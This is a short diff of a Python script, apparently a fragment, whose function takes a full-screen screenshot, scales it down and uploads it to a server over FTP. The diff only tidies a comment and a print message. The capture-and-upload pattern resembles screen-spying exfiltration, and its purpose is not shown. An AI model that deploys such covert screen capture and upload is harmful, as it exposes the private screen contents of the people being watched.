@@ -10,7 +10,7 @@ def server_upload():
         sct.shot(mon=-1, output="te.png")
     img = cv2.imread('te.png')
     #Scale Down the Screenshot Image to reduce size
-    scale_percent = 20 # percent of original size
+    scale_percent = 20 #Percent of original size
     width = int(img.shape[1] * scale_percent / 100)
     height = int(img.shape[0] * scale_percent / 100)
     dim = (width, height)
@@ -25,6 +25,6 @@ def server_upload():
     session.storbinary('STOR test.jpg', file)     
     file.close()                                   
     session.quit()
-    print("upload Success")
+    print("Upload Success")
 
 server_upload()
